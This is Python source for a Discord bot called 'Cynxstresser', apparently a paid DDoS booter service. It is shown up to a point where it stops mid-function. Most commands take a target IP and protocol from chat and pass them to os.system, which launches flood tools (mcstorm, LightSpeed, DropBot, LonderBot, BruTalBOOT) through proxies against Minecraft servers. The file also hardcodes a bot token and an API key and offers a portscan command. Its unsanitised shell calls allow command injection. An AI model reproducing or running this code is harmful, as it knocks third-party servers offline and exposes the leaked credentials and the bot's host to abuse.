from unicodedata import name
import discord
from discord.ext import commands, tasks
from discord.ext.commands import Bot
from subprocess import Popen, PIPE
import subprocess
import random
import os
import threading
import requests
import urllib.request
import json
import asyncio
import aiohttp
import sqlite3
import time
import sched
import re
import psutil
from discord import utils
from discord.utils import get
from psutil import Process, virtual_memory

from datetime import datetime
from colorama import Fore, init

init()
red = Fore.RED
lred = Fore.LIGHTRED_EX
black = Fore.BLACK
lblack = Fore.LIGHTBLACK_EX
white = Fore.WHITE
green = Fore.GREEN
lgreen = Fore.LIGHTGREEN_EX
lcyan = Fore.LIGHTCYAN_EX
lmagenta = Fore.LIGHTMAGENTA_EX
yellow = Fore.YELLOW
lyellow = Fore.LIGHTYELLOW_EX
reset = Fore.RESET

token = "OTYyMzMyOTQ4OTI4MDI4Njgz.YlGAZg.OHW6q9V1CvfNn8JinDNksl6ITF4"

methods_list = ['join', 'legitjoin', 'localhost', 'invalidnames', 'longnames', 'botjoiner', 'power', 'spoof', 'ping', 'spam', 'killer', 'nullping', 'charonbot', 'multikiller', 'packet', 'handshake', 'bighandshake', 'query', 'bigpacket', 'network', 'randombytes', 'extremejoin', 'spamjoin', 'nettydowner', 'ram', 'yoonikscry', 'colorcrasher', 'tcphit', 'queue', 'botnet', 'tcpbypass', 'ultimatesmasher', 'sf', 'nabcry'] # methods in mcstorm
channel_id = 988979368355299369
protocols_list = ['758', '757', '756', '755', '754', '753', '751', '736', '735', '578', '575', '573', '498', '490', '485', '480', '477', '404', '401', '393', '340', '338 ', '335', '316', '210', '110', '109', '107', '47' ]



client = commands.Bot(command_prefix='$')
client.remove_command('help')


banner_two = f"""\n   
                                               {red}╭━━━┳╮╱╱╭┳━╮╱╭┳━╮╭━╮
                                               {red}┃╭━╮┃╰╮╭╯┃┃╰╮┃┣╮╰╯╭╯
                                               {red}┃┃╱╰┻╮╰╯╭┫╭╮╰╯┃╰╮╭╯
                                               {white}┃┃╱╭╮╰╮╭╯┃┃╰╮┃┃╭╯╰╮
                                               {white}┃╰━╯┃╱┃┃╱┃┃╱┃┃┣╯╭╮╰╮
                                               {white}╰━━━╯╱╰╯╱╰╯╱╰━┻━╯╰━╯"""



@client.event
async def on_ready():
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Prefix: $"))
    
    print(banner_two)
    print(f"                                               {lred}Cynxstresser Started.")
    print(f"                                        {lgreen}Author: {lcyan}Cynx#2971 {black}~ {lmagenta}github.com/Cynxbb")

colors = [0xFFE4E1, 0x00FF7F, 0xD8BFD8, 0xDC143C, 0xFF4500, 0xDEB887, 0xADFF2F, 0x800000, 0x4682B4, 0x006400, 0x808080, 0xA0522D, 0xF08080, 0xC71585, 0xFFB6C1, 0x00CED1]

@client.command()
async def botping(ctx):
    await ctx.send("Botping: **{0}ms**".format(round(client.latency * 1000)))

@client.command()
@commands.has_role('Dev')
async def kick(ctx, member: discord.Member, reason="No reason."):
    await ctx.send(f"{member.mention} have been kicked | Reason: {reason}")
    await member.kick(reason=reason)
    
@client.command()
@commands.has_role("Dev")
async def ban(ctx, member: discord.Member, *, reason=None):
    if reason==None:
      reason=" no reason provided"
    await ctx.guild.ban(member)
    await ctx.send(f'User {member.mention} has been kicked for {reason}')
@client.command()
@commands.has_role('Dev')
async def unban(ctx, member: discord.Member):
    await ctx.send(f"{member.mention} have been unbanned.")
    await member.unban()



@client.command(aliases=['avt'])
async def avatar(ctx, *, member: discord.Member = None):
    member = ctx.author if not member else member 
    embed = discord.Embed(title = f"{member.name}'s Avatar:", color=random.choice(colors) , timestamp= ctx.message.created_at)
    embed.set_image(url=member.avatar_url)
    embed.set_footer(text=f"𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
    await ctx.send(embed=embed)

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        embed = discord.Embed(title=f"You using wrong command.", color=discord.Color.from_rgb(255, 153, 0))
        await ctx.send(embed=embed)
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title="You do not have enough permission to do that.",color=discord.Color.from_rgb(255, 153, 0))
        await ctx.send(embed=embed)
    if isinstance(error, commands.errors.MissingRequiredArgument):
        embed = discord.Embed(title="Please provide a argument! You cant leave a field blank, please use $help for more context.",color=discord.Color.from_rgb(255, 153, 0))
        await ctx.send(embed=embed)
    if isinstance(error, commands.errors.MissingAnyRole):
        embed = discord.Embed(title="Please contact the admin/owner to purchase a plan to gain access to this command!",color=discord.Color.from_rgb(255, 153, 0))
        await ctx.send(embed=embed)

@client.command()
async def proxy(ctx):
    def update():
        os.system('rm proxies.txt')
        os.system('python3 proxies-scrape.py')
    t1 = threading.Thread(target=update)

    t1.start()

    embed = discord.Embed(
        title='**The new proxy has been loaded!**', color=random.choice(colors) , timestamp= ctx.message.created_at)
    embed.set_image(url=f'')
    embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
    await ctx.send(embed=embed)

@client.command()
async def invite(ctx):
    if ctx.message.channel.id != channel_id:
        em = discord.Embed(title=f"❌ **ERROR**.", description=f"**😶‍🌫️Invalid Channel Id > #attack **", color=ctx.author.color)
        await ctx.send(embed=em)
        return
    embed = discord.Embed(
        title="Invite Discord Server", color=random.choice(colors) , timestamp= ctx.message.created_at)
    embed.add_field(name='**Invite link**:', value='https://dsc.gg/cynxstresser \n https://discord.gg/TXr7S22fuK \n https://discord.io/cynxstresser', inline=True)
    embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
    await ctx.send(embed=embed)   

        
  


@client.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, limit=50, member: discord.Member=None):
    
    await ctx.message.delete()
    msg = []
    try:
        limit = int(limit)
    except:
        return await ctx.send("Please pass in an integer as limit")
    if not member:
        await ctx.channel.purge(limit=limit)
        return await ctx.send(f"Purged {limit} messages", delete_after=3)
    async for m in ctx.channel.history():
        if len(msg) == limit:
            break
        if m.author == member:
            msg.append(m)
    await ctx.channel.delete_messages(msg)
    await ctx.send(f"Purged {limit} messages of {member.mention}", delete_after=10)
@client.command(name='portscan')
async def posss(ctx, arg1):
    if arg1 == 'myipwashere!':
     await ctx.send("invalid ip!")
    else:
       async with aiohttp.ClientSession() as session:
                async with session.get(f"https://api.viewdns.info/portscan/?host={arg1}&apikey=629e5c64f2ca88c1652e746b083af35a06cc57bb&output=json") as r:
                       if r.status == 200:
                        text = await r.text()
                        embed1 = discord.Embed(title=(f'results from {arg1}'), description=(text), color=discord.Color.from_rgb(0, 191, 255))
                        await ctx.send(embed=embed1)
                       else:
                           erroremb = discord.Embed(title="There was an error!",
                                                    description="The api is likely down, contact owner",
                                                    colour=discord.Colour.red())
                           await ctx.send(embed=erroremb)





@client.command()
async def attack(ctx, arg1, arg2, arg3):
    def attack():
            os.system(
                f"java -Xmx14384M -jar mcstorm2.jar {arg1} {arg2} {arg3} 120 -1")
            os.system(f"")
    embed = discord.Embed(title=f'>> ***ATTACK SENT SUCCESSFULLY*** <<', color=random.choice(colors) , timestamp= ctx.message.created_at)
    embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
    embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``{arg3}``', value='**[𝗧𝗜𝗠𝗘]**: ``120sec``', inline=False)
    embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
    embed.set_thumbnail(url=f'https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
    embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")

    if str(arg2) not in protocols_list:
        em = discord.Embed(title=f"❌ **ERROR**.", description=f"**👿 Invalid protocols > $protocols**", color=ctx.author.color)
        await ctx.send(embed=em)
        return


    if arg3 not in methods_list:
        em = discord.Embed(title=f"❌ **ERROR**.", description=f"**👺Invalid methods - $methods**", color=ctx.author.color)
        await ctx.send(embed=em)
        return

    if ctx.message.channel.id != channel_id:
        em = discord.Embed(title=f"❌ **ERROR**.", description=f"**😶‍🌫️Invalid Channel Id > #attack **", color=ctx.author.color)
        await ctx.send(embed=em)
        return

    t1 = threading.Thread(target=attack)

    t1.start()

    await ctx.send(embed=embed)

@client.command()
async def protocols(ctx):
    embed = discord.Embed(
        title="𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹𝘀",
        color=random.choice(colors) , timestamp= ctx.message.created_at)
    
    embed.add_field(name='**1.18.2**', value='758', inline=True)
    embed.add_field(name='**1.18.1**', value='757', inline=True)
    embed.add_field(name='**1.18**', value='757', inline=True)
    embed.add_field(name='**1.17.1**', value='756', inline=True)
    embed.add_field(name='**1.16.5**', value='754', inline=True)
    embed.add_field(name='**1.16.3**', value='753', inline=True)
    embed.add_field(name='**1.16.2**', value='751', inline=True)
    embed.add_field(name='**1.16.1**', value='736', inline=True)
    embed.add_field(name='**1.16**', value='735', inline=True)
    embed.add_field(name='**1.15.1**', value='575', inline=True)
    embed.add_field(name='**1.15.2**', value='578', inline=True)
    embed.add_field(name='**1.15.1**', value='575', inline=True)
    embed.add_field(name='**1.15**', value='573', inline=True)
    embed.add_field(name='**1.14.4**', value='498', inline=True)
    embed.add_field(name='**1.14.3**', value='490', inline=True)
    embed.add_field(name='**1.14.2**', value='485', inline=True)
    embed.add_field(name='**1.14.1**', value='480', inline=True)
    embed.add_field(name='**1.14**', value='477', inline=True)
    embed.add_field(name='**1.13.2**', value='404', inline=True)
    embed.add_field(name='**1.13.1**', value='401', inline=True)
    embed.add_field(name='**1.13**', value='393', inline=True)
    embed.add_field(name='**1.12.2**', value='340', inline=True)
    embed.add_field(name='**1.10.2**', value='210', inline=True)
    embed.add_field(name='**1.8.9**', value='47', inline=True)
    embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
    await ctx.send(embed=embed)

@client.command()
async def stats(ctx):
    memoryused = round(psutil.virtual_memory().used / 1000000000, 2)
    memory = f"{memoryused}GB"
    embed = discord.Embed(title = '𝗦𝘆𝘀𝘁𝗲𝗺 𝗥𝗲𝘀𝗼𝘂𝗿𝗰𝗲 𝗨𝘀𝗮𝗴𝗲:', description = '')
    embed.add_field(name = 'CPU Usage:', value = f'{psutil.cpu_percent()}%', inline = False)
    embed.add_field(name= 'RAM Usage:', value=memory)
    embed.add_field(name = 'Memory Usage:', value = f'{psutil.virtual_memory().percent}%', inline = False)
    embed.add_field(name = 'Available Memory:', value = f'{psutil.virtual_memory().available * 100 / psutil.virtual_memory().total}%', inline = False)
    await ctx.send(embed = embed)




@client.command()

async def storm(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1') 
        pass
    else:
        def attack():
            os.system(f"java -jar LightSpeed.jar {arg1} 1000 proxies.txt 1 {arg2} 60 100 800 10")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<', color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``storm``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()

async def tcpkiller(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar LightSpeed.jar {arg1} 1000 proxies.txt 2 {arg2} 60 100 800 10")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<', color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``tcpkiller``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()

async def brutalcpu(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1') #it use other botter and i want it also exec (methods storm from lightspeed   )
        pass
    else:
        def attack():
            os.system(f"java -jar LightSpeed.jar {arg1} 1000 proxies.txt 14 {arg2} 60 100 800 10")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<', color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``brutalcpu``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)



@client.command()

async def cpufucker(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1') 
        pass
    else:
        def attack():
            os.system(f"java -jar LightSpeed.jar {arg1} 1000 proxies.txt 15 {arg2} 60 100 800 10")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<', color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``cpufucker``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

    







    

@client.command()

async def nullping(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -Dr=false -Dlen=25555 -jar nettybooter.jar {arg1} 6 90000 {arg2} 60 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``nullping``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)




@client.command()

async def abdeluxe(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar DropBotv9-beta_obf.jar host={arg1} port={arg2} pfile=proxies.txt threads=90000 time=60 method=antibotdeluxe version={arg3} license=123ascqweq11")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗢𝗥𝗧]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``abdeluxe``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)


@client.command()

async def flamecord(ctx, arg1, arg2, arg3):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar DropBotv9-beta_obf.jar host={arg1} port={arg2} pfile=proxies.txt threads=10000 method=flamecord version={arg3} license=123ascqweq11")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗢𝗥𝗧]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``flamecord``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)





        
        

    
    
@client.command()

async def rameater(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar LonderBot.jar {arg1} 12 10000 {arg2} 60 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``rameater``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)




@client.command()

async def byte(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar LonderBot.jar {arg1} 7 10000 {arg2} 60 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``byte``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)




@client.command()
async def aegis(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar LonderBot.jar {arg1} 15 10000 {arg2} 60 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``aegis``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)


@client.command()

async def cpudowner(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar BruTalBOOT.jar {arg1} 16 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``cpudowner``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()

async def ultimatekiller(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar BruTalBOOT.jar {arg1} 14 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``ultimatekiller``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
